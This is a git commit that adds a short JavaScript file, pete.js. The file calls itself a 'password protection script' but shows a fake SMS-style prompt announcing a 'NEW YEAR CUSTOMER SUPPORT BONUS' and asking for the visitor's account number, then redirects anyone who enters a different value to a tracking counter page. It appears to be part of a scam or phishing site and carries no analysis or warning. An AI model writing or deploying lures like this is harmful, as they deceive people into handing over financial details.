054c6307b7b3a3d8351e2192e196799ec07822b3
ita-giftt <tallaakoti@gmail.com>
2026-01-03 16:56:47 +0100

    Create pete.js

---
+++ pete.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive NEW YEAR CUSTOMER SUPPORT BONUS. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://www.supercounters.com/stats/1726401';
+}
